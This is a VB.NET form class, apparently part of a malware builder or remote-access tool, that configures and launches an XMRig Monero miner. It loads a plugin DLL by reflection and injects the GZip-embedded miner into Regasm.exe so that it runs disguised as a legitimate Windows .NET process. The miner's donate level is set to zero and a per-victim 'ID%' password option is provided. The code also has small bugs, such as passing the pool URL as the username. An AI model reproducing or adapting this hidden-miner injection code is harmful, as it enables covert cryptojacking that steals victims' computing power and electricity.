Public Class XMR

    'For more info https://coinguides.org/xmrig-beginners-guide/

    Public M As Main
    Public OK As Boolean = False
    Public K As Boolean = False
    Public C As Boolean = False
    Public ofd As New OpenFileDialog
    Public cpu
    Public url
    Public user
    Public pass
    Public cus

    Private Sub MetroButton1_Click(sender As Object, e As EventArgs) Handles MetroButton1.Click
        On Error Resume Next
        If MetroCheckBox1.Checked AndAlso txtCustoms.Text.Length > 5 Then
            cus = txtCustoms.Text + "<CUS>"
            K = False
            OK = True
            C = True
            Me.Close()

        Else

            If txtCPU.Value.ToString = "" OrElse txtURL.Text = "" OrElse txtUSER.Text = "" Then
                MsgBox("Enter your settings", MsgBoxStyle.Exclamation)
                Return
            Else

                If chk.Checked = True Then
                    cpu = "50%"
                Else
                    cpu = txtCPU.Value.ToString
                End If

                If chkPass.Checked Then
                    pass = "ID%"
                Else
                    pass = txtPASS.Text
                End If

                C = False
                url = txtURL.Text
                user = txtUSER.Text
                K = False
                OK = True
                Me.Close()
            End If

        End If



    End Sub

    Private Sub MetroButton2_Click(sender As Object, e As EventArgs) Handles MetroButton2.Click
        On Error Resume Next
        K = True
        OK = True
        Me.Close()
    End Sub

    Private Sub chk_CheckedChanged(sender As Object, e As EventArgs) Handles chk.CheckedChanged
        On Error Resume Next
        If chk.Checked Then
            txtCPU.Enabled = False
        Else
            txtCPU.Enabled = True
        End If
    End Sub

    Private Sub chkPass_CheckedChanged(sender As Object, e As EventArgs) Handles chkPass.CheckedChanged
        On Error Resume Next
        If chkPass.Checked Then
            txtPASS.Enabled = False
        Else
            txtPASS.Enabled = True
        End If
    End Sub

    Private Sub MetroCheckBox1_CheckedChanged(sender As Object, e As EventArgs) Handles MetroCheckBox1.CheckedChanged
        On Error Resume Next
        If MetroCheckBox1.Checked Then
            txtCustoms.Enabled = True
            txtCPU.Enabled = False
            txtUSER.Enabled = False
            url.Enabled = False
            txtPASS.Enabled = False
            chk.Enabled = False
            chkPass.Enabled = False

        Else
            txtCustoms.Enabled = False
            txtCPU.Enabled = True
            txtUSER.Enabled = True
            txtURL.Enabled = True
            txtPASS.Enabled = True
            chk.Enabled = True
            chkPass.Enabled = True
        End If
    End Sub

    Private Sub MetroTile1_Click(sender As Object, e As EventArgs) Handles MetroTile1.Click
        On Error Resume Next
        If txtCPU.Text = "" OrElse txtURL.Text = "" OrElse txtUSER.Text = "" Then MsgBox("Enter your settings", MsgBoxStyle.Exclamation) : Return

        If MetroCheckBox1.Checked AndAlso txtCustoms.Text.Length > 5 Then
            cus = txtCustoms.Text + "<CUS>"
            Reflection.Assembly.Load(IO.File.ReadAllBytes(Application.StartupPath + "\Misc\Plugins\XMR.dll")).GetType("XMR.Main").GetMethod("Run", Reflection.BindingFlags.Public Or Reflection.BindingFlags.Static).Invoke(Nothing, New Object() {"C:\Windows\Microsoft.NET\Framework\v4.0.30319\Regasm.exe", cus.Split("<CUS>")(0), GZip(My.Resources.xm, False), True})
            Return
        Else
            If chk.Checked Then
                Reflection.Assembly.Load(IO.File.ReadAllBytes(Application.StartupPath + "\Misc\Plugins\XMR.dll")).GetType("XMR.Main").GetMethod("Run", Reflection.BindingFlags.Public Or Reflection.BindingFlags.Static).Invoke(Nothing, New Object() {"C:\Windows\Microsoft.NET\Framework\v4.0.30319\Regasm.exe", "--donate-level=0 -t " & Environment.ProcessorCount / 2 & " -a cryptonight --url=" & txtURL.Text & " -u " & txtURL.Text & " -p " & txtPASS.Text & " -R --variant=-1 --max-cpu-usage=75", GZip(My.Resources.xm, False), True})
                Return
            Else
                Reflection.Assembly.Load(IO.File.ReadAllBytes(Application.StartupPath + "\Misc\Plugins\XMR.dll")).GetType("XMR.Main").GetMethod("Run", Reflection.BindingFlags.Public Or Reflection.BindingFlags.Static).Invoke(Nothing, New Object() {"C:\Windows\Microsoft.NET\Framework\v4.0.30319\Regasm.exe", "--donate-level=0 -t " & txtCPU.Text & " -a cryptonight --url=" & txtURL.Text & " -u " & txtURL.Text & " -p " & txtPASS.Text & " -R --variant=-1 --max-cpu-usage=75", GZip(My.Resources.xm, False), True})
                Return
            End If
        End If
    End Sub

    Private Sub txtCPU_ValueChanged(sender As Object, e As EventArgs) Handles txtCPU.ValueChanged
        If txtCPU.Value = 1 Then
            txtCPU.ForeColor = Color.FromArgb(142, 188, 0)
        ElseIf txtCPU.Value = 2 Then
            txtCPU.ForeColor = Color.FromArgb(142, 188, 0)
        ElseIf txtCPU.Value = 3 Then
            txtCPU.ForeColor = Color.Yellow
        ElseIf txtCPU.Value >= 4 Then
            txtCPU.ForeColor = Color.Red
        End If
    End Sub
End Class